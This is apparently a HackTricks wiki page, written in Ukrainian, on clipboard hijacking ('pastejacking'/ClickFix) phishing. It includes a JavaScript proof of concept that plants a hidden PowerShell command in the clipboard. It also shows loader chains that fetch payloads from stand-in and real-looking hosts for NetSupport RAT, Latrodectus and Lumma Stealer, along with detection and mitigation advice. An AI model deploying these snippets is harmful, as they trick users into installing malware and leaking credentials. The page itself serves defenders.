# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте нічого, що ви не скопіювали самі." – стара, але все ще актуальна порада

## Overview

Clipboard hijacking – також відомий як *pastejacking* – зловживає тим, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Зловмисна веб-сторінка (або будь-який контекст, що підтримує JavaScript, такий як Electron або настільний додаток) програмно вставляє текст, контрольований атакуючим, у системний буфер обміну. Жертви зазвичай заохочуються, за допомогою ретельно продуманих інструкцій соціальної інженерії, натиснути **Win + R** (діалог виконання), **Win + X** (швидкий доступ / PowerShell) або відкрити термінал і *вставити* вміст буфера обміну, негайно виконуючи довільні команди.

Оскільки **жоден файл не завантажується і жоден вкладення не відкривається**, техніка обходить більшість контролів безпеки електронної пошти та веб-контенту, які моніторять вкладення, макроси або безпосереднє виконання команд. Тому атака популярна в фішингових кампаніях, що постачають комерційні сімейства шкідливих програм, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старі кампанії використовували `document.execCommand('copy')`, нові покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).

## Потік ClickFix / ClearFake

1. Користувач відвідує сайт з помилками в написанні або скомпрометований сайт (наприклад, `docusign.sa[.]com`)
2. Впроваджений **ClearFake** JavaScript викликає допоміжну функцію `unsecuredCopyToClipboard()`, яка безшумно зберігає Base64-кодований однолінійний PowerShell у буфер обміну.
3. HTML-інструкції кажуть жертві: *“Натисніть **Win + R**, вставте команду та натисніть Enter, щоб вирішити проблему.”*
4. `powershell.exe` виконується, завантажуючи архів, що містить легітимний виконуваний файл та шкідливу DLL (класичне завантаження DLL).
5. Завантажувач розшифровує додаткові етапи, впроваджує shellcode та встановлює постійність (наприклад, заплановане завдання) – врешті-решт запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Приклад ланцюга NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своїй директорії `msvcp140.dll`.
* Зловмисна DLL динамічно вирішує API за допомогою **GetProcAddress**, завантажує два бінарних файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх, використовуючи змінний XOR ключ `"https://google.com/"`, інжектує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript завантажувач всередині **cscript.exe**
3. Отримує MSI вантаж → скидає `libcef.dll` поряд з підписаним додатком → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** виклик запускає прихований PowerShell скрипт, який отримує `PartyContinued.exe`, витягує `Boat.pst` (CAB), реконструює `AutoIt3.exe` через `extrac32` та конкатенацію файлів, а врешті-решт запускає `.a3x` скрипт, який ексфільтрує облікові дані браузера на `sumeriavgv.digital`.

## Виявлення та полювання

Блакитні команди можуть поєднувати телеметрію буфера обміну, створення процесів та реєстру, щоб визначити зловживання pastejacking:

* Реєстр Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** – шукайте незвичайні записи Base64 / обфусцировані.
* Ідентифікатор події безпеки **4688** (Створення процесу), де `ParentImage` == `explorer.exe` і `NewProcessName` в { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Ідентифікатор події **4663** для створення файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або тимчасових папок безпосередньо перед підозрілою подією 4688.
* Датчики буфера обміну EDR (якщо присутні) – корелюйте `Clipboard Write`, за яким негайно слідує новий процес PowerShell.

## Заходи пом'якшення

1. Ускладнення браузера – вимкніть доступ на запис у буфер обміну (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагайте жесту користувача.
2. Обізнаність у сфері безпеки – навчіть користувачів *вводити* чутливі команди або спочатку вставляти їх у текстовий редактор.
3. Режим обмеженої мови PowerShell / Політика виконання + Контроль застосунків для блокування довільних однорядкових команд.
4. Мережеві контролі – блокувати вихідні запити до відомих доменів pastejacking та C2 шкідливого ПЗ.

## Схожі трюки

* **Discord Invite Hijacking** часто зловживає тим же підходом ClickFix після заманювання користувачів на шкідливий сервер:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Посилання

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
